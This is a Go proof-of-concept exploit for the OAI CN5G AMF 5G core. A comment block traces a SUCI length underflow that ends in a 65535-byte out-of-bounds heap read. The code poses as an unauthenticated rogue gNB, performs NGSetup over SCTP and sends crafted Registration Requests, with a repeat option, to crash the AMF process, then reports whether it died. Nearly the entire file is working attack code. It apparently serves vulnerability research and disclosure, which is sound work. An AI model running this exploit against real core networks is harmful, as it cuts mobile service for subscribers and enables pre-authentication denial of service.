// OAI CN5G AMF -- out-of-bounds heap read PoC (rogue gNB, pre-auth NAS injection).
//
// Target: OAI CN5G AMF (develop), NAS 5GMM decoder for the 5GS mobile identity
// IE (SUCI) inside a Registration Request, delivered pre-authentication over
// NGAP/SCTP 38412.
//
// Root cause chain (all paths relative to sources/oai-cn5g-amf):
//
//  1. amf_n1.cpp:1938
//         registration_request->Decode((uint8_t*) bdata(reg), blength(reg));
//     `reg` is a bstring whose length is exactly the NGAP NAS-PDU octet count.
//
//  2. RegistrationRequest.cpp:834-838 decodes the 5GS mobile identity FIRST
//     (is_iei = false), before any other IE and before any minimum-length
//     validation:
//         NasHelper::Decode(ie_5gs_mobile_identity_, buf, len, decoded_size, false)
//
//  3. Type6NasIe::Decode (Type6NasIe.cpp:114-131) -> Validate (Type6NasIe.cpp:58-68)
//     enforces ONLY an upper bound:
//         if (len < GetHeaderLength() + li_) return KEncodeDecodeError;
//     There is NO minimum content length, so li_ (ie_len) may be 0..7.
//
//  4. _5gsMobileIdentity::Decode (_5gsMobileIdentity.cpp:68-120) dispatches on
//     `octet & 0x07 == kSuci (0b001)` and calls, at :92-93:
//         DecodeSuci(buf + decoded_size, len - decoded_size, ie_len)
//
//  5. DecodeSuci (_5gsMobileIdentity.cpp:312-...) unconditionally reads a FIXED
//     8-octet IMSI layout through the unchecked DECODE_U8 macro
//     (common_defs.h:48-50 -> `vALUE = *(uint8_t*)(bUFFER); sIZE += 1`):
//         :319 SUPI format / type of identity   -> decoded_size 1
//         :326 decodeMccMncFromBuffer (3 bytes) -> decoded_size 4
//         :335 routing indicator digit pair     -> decoded_size 5
//         :339 routing indicator digit pair     -> decoded_size 6
//         :369 protection scheme id             -> decoded_size 7
//         :376 home network public key id       -> decoded_size 8
//     decoded_size is 8 no matter how small ie_len is.
//
//  6. At :370 the protection scheme id is `0x0f & buf[6]`. When the declared
//     ie_len is 7 (or smaller with trailing NAS bytes present) buf[6] is still
//     attacker-controlled, so setting it to any non-zero value selects the
//     "protection scheme != null" else-branch at :418.
//
//  7. _5gsMobileIdentity.cpp:424 -- THE UNDERFLOW:
//         int scheme_output_length = ie_len - decoded_size;   // 7 - 8 == -1
//     followed by :427-429
//         decode_bstring(&scheme_output, scheme_output_length,
//                        (buf + decoded_size), ie_len - decoded_size);
//
//  8. decode_bstring (TLVDecoder.c:16-31) takes the two lengths as UNSIGNED:
//         int decode_bstring(bstring* bstr, const uint16_t pdulen,
//                            const uint8_t* const buffer, const uint32_t buflen)
//         if (buflen < pdulen) return TLV_BUFFER_TOO_SHORT;   // the ONLY guard
//     With -1 the arguments become pdulen = 65535 and buflen = 4294967295, so
//     `4294967295 < 65535` is FALSE and the guard is defeated.
//
//  9. TLVDecoder.c:25 -> blk2bstr(buffer, 65535) (bstrlib.c:286-310). len is
//     positive so the `len < 0` guard does not fire; bstr__alloc is malloc,
//     bstr__memcpy is a RAW memcpy (bstrlib.c:42 and :59):
//         b->data = malloc(snapUpSize(65536));   // 131072
//         if (len > 0) memcpy(b->data, blk, 65535);
//     i.e. a 65535-byte read starting just past the end of a ~26-byte heap
//     buffer -> CWE-125 out-of-bounds read -> SIGSEGV, AMF process dies.
//
// Boundary: ie_len == 8 is the first SAFE value (scheme_output_length == 0, so
// blk2bstr takes the `if (len > 0)` false path and copies nothing). Every
// ie_len in 0..7 underflows. The PoC therefore supports a threshold sweep.
//
// Contrast (defended reference): open5GS guards the identical SUCI parse with
// explicit SUCI_MIN_SIZE+1 minimum-length checks; OAI does not.
//
// Flow: NGSetup -> InitialUEMessage(Registration Request, truncated SUCI).
// No subscriber provisioning, no security context and no authentication needed.
package main

import (
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"syscall"
	"time"

	"github.com/free5gc/aper"
	"github.com/free5gc/ngap"
	"github.com/free5gc/ngap/ngapType"
	"github.com/free5gc/sctp"
)

func syscallTimeval(msec int64) syscall.Timeval {
	return syscall.Timeval{Sec: msec / 1000, Usec: (msec % 1000) * 1000}
}

func isEAGAIN(err error) bool {
	return errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EINTR)
}

// encodePLMN builds the NGAP PLMNIdentity (TS 38.413) BCD octets.
func encodePLMN(mcc, mnc string) ngapType.PLMNIdentity {
	b := make([]byte, 3)
	b[0] = (mcc[1]-'0')<<4 | (mcc[0] - '0')
	if len(mnc) == 2 {
		b[1] = 0xf0 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	} else {
		b[1] = (mnc[2]-'0')<<4 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	}
	return ngapType.PLMNIdentity{Value: aper.OctetString(b)}
}

func encodeTAC(tac uint64) ngapType.TAC {
	tacBytes, _ := hex.DecodeString(fmt.Sprintf("%06x", tac))
	return ngapType.TAC{Value: aper.OctetString(tacBytes)}
}

// plmnBCD encodes MCC/MNC in the NAS/TS 24.008 octet order used inside a SUCI.
func plmnBCD(mcc, mnc string) []byte {
	b := make([]byte, 3)
	b[0] = (mcc[1]-'0')<<4 | (mcc[0] - '0')
	if len(mnc) == 2 {
		b[1] = 0xf0 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	} else {
		b[1] = (mnc[2]-'0')<<4 | (mcc[2] - '0')
		b[2] = (mnc[1]-'0')<<4 | (mnc[0] - '0')
	}
	return b
}

// truncatedSuciIE builds the 5GS mobile identity IE *content* for a SUCI whose
// declared length is ieLen. The full IMSI layout OAI reads is:
//
//	[0]   SUPI format (bits 6-4) | type of identity (bits 3-1)
//	[1-3] MCC/MNC (BCD)
//	[4-5] routing indicator
//	[6]   protection scheme id
//	[7]   home network public key identifier
//	[8-]  scheme output / MSIN
//
// We emit only the first `ieLen` octets, so the IE declares fewer bytes than
// DecodeSuci's fixed 8-octet walk consumes -> ie_len - decoded_size < 0.
func truncatedSuciIE(mcc, mnc string, ieLen int, scheme byte) []byte {
	full := make([]byte, 0, 16)
	full = append(full, 0x01) // SUPI format = IMSI (0b000), type of identity = SUCI (0b001)
	full = append(full, plmnBCD(mcc, mnc)...)
	full = append(full, 0x00, 0x00) // routing indicator
	full = append(full, scheme)     // protection scheme id -- MUST be non-zero
	if len(full) < ieLen {
		// pad so a larger ieLen can still be exercised (ieLen >= 8 is the safe
		// control case; pad with home-network-pki + MSIN digits)
		full = append(full, 0x00)
		for len(full) < ieLen {
			full = append(full, 0x10)
		}
	}
	return full[:ieLen]
}

// buildRegistrationRequest builds a plain-NAS 5GMM Registration Request whose
// 5GS mobile identity IE declares ieLen octets of SUCI content.
//
//	7e 00 41 79 | <ieLen:2> <SUCI content ieLen B> | 2e 04 f0f0f0f0 | 2f 05 04 <sst> <sd>
//
// OAI decodes the 5GS mobile identity as a Type 6 IE with a 2-octet length and
// WITHOUT the spec's 0x77 IEI octet (is_iei == false at RegistrationRequest.cpp:835).
// The trailing UE security capability / requested NSSAI IEs are kept so that
// `len - decoded_size` stays large: they guarantee decodeMccMncFromBuffer
// returns 3 (not -1) and make buf[6]/buf[7] attacker-controlled in-bounds
// reads, which is what makes the underflow deterministic.
func buildRegistrationRequest(mcc, mnc string, ieLen int, scheme byte, sst byte, sd string, trailer bool) []byte {
	nas := []byte{0x7e, 0x00, 0x41} // EPD 5GMM, plain NAS security header, Registration Request
	nas = append(nas, 0x79)         // ngKSI (high nibble) + registration type (low nibble)

	mid := truncatedSuciIE(mcc, mnc, ieLen, scheme)
	nas = append(nas, byte(ieLen>>8), byte(ieLen))
	nas = append(nas, mid...)

	if trailer {
		// UE security capability (IEI 0x2e): EA0-7, IA0-7
		nas = append(nas, 0x2e, 0x04, 0xf0, 0xf0, 0xf0, 0xf0)
		// Requested NSSAI (IEI 0x2f)
		sdB, _ := hex.DecodeString(sd)
		nas = append(nas, 0x2f, 0x05, 0x04, sst, sdB[0], sdB[1], sdB[2])
	}
	return nas
}

func buildNGSetupRequest(mcc, mnc string, tac uint64, gnbId uint32, sst byte, sd string) ([]byte, error) {
	pdu := ngapType.NGAPPDU{}
	pdu.Present = ngapType.NGAPPDUPresentInitiatingMessage
	pdu.InitiatingMessage = new(ngapType.InitiatingMessage)
	im := pdu.InitiatingMessage
	im.ProcedureCode.Value = ngapType.ProcedureCodeNGSetup
	im.Criticality.Value = ngapType.CriticalityPresentReject
	im.Value.Present = ngapType.InitiatingMessagePresentNGSetupRequest
	im.Value.NGSetupRequest = new(ngapType.NGSetupRequest)
	req := im.Value.NGSetupRequest
	{
		ie := ngapType.NGSetupRequestIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDGlobalRANNodeID
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.NGSetupRequestIEsPresentGlobalRANNodeID
		ie.Value.GlobalRANNodeID = new(ngapType.GlobalRANNodeID)
		grni := ie.Value.GlobalRANNodeID
		grni.Present = ngapType.GlobalRANNodeIDPresentGlobalGNBID
		grni.GlobalGNBID = new(ngapType.GlobalGNBID)
		grni.GlobalGNBID.PLMNIdentity = encodePLMN(mcc, mnc)
		grni.GlobalGNBID.GNBID.Present = ngapType.GNBIDPresentGNBID
		grni.GlobalGNBID.GNBID.GNBID = new(aper.BitString)
		grni.GlobalGNBID.GNBID.GNBID.Bytes = []byte{byte(gnbId >> 24), byte(gnbId >> 16), byte(gnbId >> 8), byte(gnbId)}
		grni.GlobalGNBID.GNBID.GNBID.BitLength = 32
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.NGSetupRequestIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDSupportedTAList
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.NGSetupRequestIEsPresentSupportedTAList
		ie.Value.SupportedTAList = new(ngapType.SupportedTAList)
		bplmn := ngapType.BroadcastPLMNItem{}
		bplmn.PLMNIdentity = encodePLMN(mcc, mnc)
		ssItem := ngapType.SliceSupportItem{}
		ssItem.SNSSAI.SST.Value = aper.OctetString{sst}
		if sd != "" {
			sdB, _ := hex.DecodeString(sd)
			ssItem.SNSSAI.SD = new(ngapType.SD)
			ssItem.SNSSAI.SD.Value = aper.OctetString(sdB)
		}
		bplmn.TAISliceSupportList.List = append(bplmn.TAISliceSupportList.List, ssItem)
		taItem := ngapType.SupportedTAItem{}
		taItem.TAC = encodeTAC(tac)
		taItem.BroadcastPLMNList.List = append(taItem.BroadcastPLMNList.List, bplmn)
		ie.Value.SupportedTAList.List = append(ie.Value.SupportedTAList.List, taItem)
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.NGSetupRequestIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDDefaultPagingDRX
		ie.Criticality.Value = ngapType.CriticalityPresentIgnore
		ie.Value.Present = ngapType.NGSetupRequestIEsPresentDefaultPagingDRX
		ie.Value.DefaultPagingDRX = new(ngapType.PagingDRX)
		ie.Value.DefaultPagingDRX.Value = ngapType.PagingDRXPresentV32
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	return ngap.Encoder(pdu)
}

func buildInitialUEMessage(mcc, mnc string, tac uint64, ranUeNgapID int64, nasPdu []byte) ([]byte, error) {
	pdu := ngapType.NGAPPDU{}
	pdu.Present = ngapType.NGAPPDUPresentInitiatingMessage
	pdu.InitiatingMessage = new(ngapType.InitiatingMessage)
	im := pdu.InitiatingMessage
	im.ProcedureCode.Value = ngapType.ProcedureCodeInitialUEMessage
	im.Criticality.Value = ngapType.CriticalityPresentIgnore
	im.Value.Present = ngapType.InitiatingMessagePresentInitialUEMessage
	im.Value.InitialUEMessage = new(ngapType.InitialUEMessage)
	req := im.Value.InitialUEMessage
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDRANUENGAPID
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentRANUENGAPID
		ie.Value.RANUENGAPID = new(ngapType.RANUENGAPID)
		ie.Value.RANUENGAPID.Value = ranUeNgapID
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDNASPDU
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentNASPDU
		ie.Value.NASPDU = new(ngapType.NASPDU)
		ie.Value.NASPDU.Value = nasPdu
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDUserLocationInformation
		ie.Criticality.Value = ngapType.CriticalityPresentReject
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentUserLocationInformation
		ie.Value.UserLocationInformation = new(ngapType.UserLocationInformation)
		uli := ie.Value.UserLocationInformation
		uli.Present = ngapType.UserLocationInformationPresentUserLocationInformationNR
		uli.UserLocationInformationNR = new(ngapType.UserLocationInformationNR)
		uli.UserLocationInformationNR.NRCGI.PLMNIdentity = encodePLMN(mcc, mnc)
		uli.UserLocationInformationNR.NRCGI.NRCellIdentity.Value = aper.BitString{
			Bytes: []byte{0x00, 0x00, 0x00, 0x01, 0x00}, BitLength: 36}
		uli.UserLocationInformationNR.TAI.PLMNIdentity = encodePLMN(mcc, mnc)
		uli.UserLocationInformationNR.TAI.TAC = encodeTAC(tac)
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	{
		ie := ngapType.InitialUEMessageIEs{}
		ie.Id.Value = ngapType.ProtocolIEIDRRCEstablishmentCause
		ie.Criticality.Value = ngapType.CriticalityPresentIgnore
		ie.Value.Present = ngapType.InitialUEMessageIEsPresentRRCEstablishmentCause
		ie.Value.RRCEstablishmentCause = new(ngapType.RRCEstablishmentCause)
		ie.Value.RRCEstablishmentCause.Value = ngapType.RRCEstablishmentCausePresentMoSignalling
		req.ProtocolIEs.List = append(req.ProtocolIEs.List, ie)
	}
	return ngap.Encoder(pdu)
}

func dial(host string, port int) (*sctp.SCTPConn, error) {
	raddr, err := net.ResolveIPAddr("ip", host)
	if err != nil {
		return nil, err
	}
	cfg := sctp.SocketConfig{
		InitMsg: sctp.InitMsg{NumOstreams: 5, MaxInstreams: 5, MaxAttempts: 4, MaxInitTimeout: 8},
	}
	conn, err := cfg.Dial("sctp", nil, &sctp.SCTPAddr{IPAddrs: []net.IPAddr{*raddr}, Port: port})
	if err != nil {
		return nil, err
	}
	info, err := conn.GetDefaultSentParam()
	if err != nil {
		conn.Close()
		return nil, err
	}
	info.PPID = ngap.PPID
	if err := conn.SetDefaultSentParam(info); err != nil {
		conn.Close()
		return nil, err
	}
	return conn, nil
}

func readMsg(conn *sctp.SCTPConn, timeout time.Duration) ([]byte, error) {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 65536)
	for time.Now().Before(deadline) {
		if err := conn.SetReadTimeout(syscallTimeval(1000)); err != nil {
			return nil, err
		}
		n, info, _, err := conn.SCTPRead(buf)
		if err != nil {
			if isEAGAIN(err) {
				continue
			}
			return nil, err
		}
		if n == 0 {
			continue
		}
		if info != nil && info.PPID != ngap.PPID {
			continue
		}
		out := make([]byte, n)
		copy(out, buf[:n])
		return out, nil
	}
	return nil, fmt.Errorf("timeout")
}

func main() {
	host := flag.String("host", "172.30.0.7", "AMF NGAP IP")
	port := flag.Int("port", 38412, "AMF NGAP SCTP port")
	mcc := flag.String("mcc", "208", "PLMN MCC")
	mnc := flag.String("mnc", "95", "PLMN MNC")
	tac := flag.Uint64("tac", 0xa000, "TAC matching AMF plmn_support_list")
	sst := flag.Uint("sst", 222, "S-NSSAI SST")
	sd := flag.String("sd", "00007b", "S-NSSAI SD (hex)")
	gnbId := flag.Uint("gnbid", 0x0abeef, "rogue gNB ID")
	ieLen := flag.Int("ielen", 7, "declared 5GS mobile identity IE length (0..7 underflows; 8 is the first SAFE value)")
	scheme := flag.Uint("scheme", 1, "protection scheme id octet at SUCI content[6] (must be non-zero)")
	noTrailer := flag.Bool("no-trailer", false, "omit the trailing UE security capability / NSSAI IEs")
	dry := flag.Bool("dry", false, "print the crafted NAS PDU and exit (no network)")
	ranUeID := flag.Int64("ranueid", 1, "RAN UE NGAP ID of the first Registration Request")
	repeat := flag.Int("repeat", 1, "send this many crafted Registration Requests over ONE SCTP association")
	delay := flag.Duration("delay", 0, "delay between repeated Registration Requests (e.g. 20ms)")
	flag.Parse()

	nas := buildRegistrationRequest(*mcc, *mnc, *ieLen, byte(*scheme), byte(*sst), *sd, !*noTrailer)

	fmt.Printf("[*] crafted NAS Registration Request (%d octets), declared SUCI IE length = %d\n",
		len(nas), *ieLen)
	fmt.Printf("[*] NAS hex: %s\n", hex.EncodeToString(nas))
	fmt.Printf("[*] DecodeSuci fixed walk consumes 8 octets -> scheme_output_length = %d - 8 = %d\n",
		*ieLen, *ieLen-8)
	if *ieLen < 8 {
		fmt.Printf("[*] as uint16_t pdulen = %d, as uint32_t buflen = %d -> decode_bstring guard 'buflen < pdulen' is FALSE\n",
			uint16(*ieLen-8), uint32(*ieLen-8))
		fmt.Printf("[*] blk2bstr will memcpy %d bytes from past the end of a %d-byte heap buffer\n",
			uint16(*ieLen-8), len(nas))
	} else {
		fmt.Printf("[*] SAFE control case: scheme_output_length >= 0, blk2bstr copies nothing\n")
	}

	if *dry {
		iue, err := buildInitialUEMessage(*mcc, *mnc, *tac, *ranUeID, nas)
		if err != nil {
			log.Fatalf("[-] build InitialUEMessage: %v", err)
		}
		fmt.Printf("[*] InitialUEMessage hex (%d octets): %s\n", len(iue), hex.EncodeToString(iue))
		return
	}

	conn, err := dial(*host, *port)
	if err != nil {
		log.Fatalf("[-] SCTP dial %s:%d: %v", *host, *port, err)
	}
	defer conn.Close()
	log.Printf("[+] SCTP association to %s:%d established", *host, *port)

	// 1. NGSetup -- the AMF does not authenticate gNBs.
	ngsetup, err := buildNGSetupRequest(*mcc, *mnc, *tac, uint32(*gnbId), byte(*sst), *sd)
	if err != nil {
		log.Fatalf("[-] build NGSetup: %v", err)
	}
	if _, err := conn.SCTPWrite(ngsetup, nil); err != nil {
		log.Fatalf("[-] send NGSetup: %v", err)
	}
	resp, err := readMsg(conn, 5*time.Second)
	if err != nil {
		log.Fatalf("[-] no NGSetupResponse: %v", err)
	}
	rpdu, derr := ngap.Decoder(resp)
	if derr != nil || rpdu == nil || rpdu.Present != ngapType.NGAPPDUPresentSuccessfulOutcome {
		log.Fatalf("[-] NGSetup rejected (PLMN/TAC/NSSAI mismatch?): %s", hex.EncodeToString(resp))
	}
	log.Printf("[+] NGSetup accepted (rogue gNB %08x, unauthenticated)", *gnbId)

	// 2. InitialUEMessage(s) carrying the truncated SUCI Registration Request.
	// One association is reused for all repeats so that the AMF's per-gNB
	// context and descriptor count stay constant: any memory growth measured
	// during the run is attributable to the NAS decoder alone.
	t0 := time.Now()
	for n := 0; n < *repeat; n++ {
		id := *ranUeID + int64(n)
		iue, err := buildInitialUEMessage(*mcc, *mnc, *tac, id, nas)
		if err != nil {
			log.Fatalf("[-] build InitialUEMessage: %v", err)
		}
		if _, err := conn.SCTPWrite(iue, nil); err != nil {
			log.Printf("[!] send InitialUEMessage #%d failed after %v: %v", n+1, time.Since(t0).Round(time.Millisecond), err)
			log.Printf("[+] VERDICT: association lost after %d request(s) -> AMF process died", n)
			os.Exit(0)
		}
		if n == 0 {
			log.Printf("[+] InitialUEMessage sent at %s: Registration Request with SUCI IE length=%d, protection scheme=%d",
				t0.Format(time.RFC3339Nano), *ieLen, *scheme)
		}
		if n > 0 && *delay > 0 {
			time.Sleep(*delay)
		}
		if (n+1)%500 == 0 {
			log.Printf("[*] %d/%d crafted Registration Requests sent (%v elapsed)", n+1, *repeat, time.Since(t0).Round(time.Second))
		}
	}
	log.Printf("[+] %d crafted Registration Request(s) delivered in %v",
		*repeat, time.Since(t0).Round(time.Millisecond))

	// 3. Observe the association: a dead AMF tears the SCTP association down.
	log.Printf("[*] watching for a downlink NAS response (AMF alive) or association loss (AMF dead)...")
	for i := 0; i < 8; i++ {
		raw, rerr := readMsg(conn, 2*time.Second)
		if rerr != nil {
			if strings.Contains(fmt.Sprint(rerr), "timeout") {
				continue
			}
			log.Printf("[!] SCTP read error after %v: %v", time.Since(t0).Round(time.Millisecond), rerr)
			log.Printf("[+] VERDICT: association lost -> AMF process died (SIGSEGV in blk2bstr memcpy)")
			os.Exit(0)
		}
		pdu, derr := ngap.Decoder(raw)
		if derr != nil || pdu == nil {
			log.Printf("[*] undecodable downlink (%d octets): %s", len(raw), hex.EncodeToString(raw))
			continue
		}
		log.Printf("[*] AMF STILL ALIVE, downlink NGAP received: %s", hex.EncodeToString(raw))
	}
	log.Printf("[-] no association loss observed within the watch window; check `docker inspect oai-amf`")
}
